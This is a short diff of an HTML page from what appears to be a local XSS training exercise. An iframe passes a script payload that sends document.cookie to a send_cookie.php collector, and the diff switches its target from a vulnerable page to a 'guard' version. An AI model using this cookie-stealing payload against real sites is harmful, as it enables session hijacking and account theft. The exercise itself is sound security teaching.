@@ -4,6 +4,7 @@
 </head>
 <body>
 <p>以下に別のページを表示</p>
-<iframe width=320 height=100 src="http://localhost/websecurity/xss/steal_cookie.php?word=<script>window.location='http://localhost/websecurity/xss/send_cookie.php?sid='%2Bdocument.cookie;</script>"></iframe>
+<iframe width=320 height=100 src="http://localhost/websecurity/xss/steal_cookie_guard.php?word=<script>window.location='http://localhost/websecurity/xss/send_cookie.php?sid='%2Bdocument.cookie;</script>"></iframe>
+<a href="./index.html">戻る</a>
 </body>
 </html>
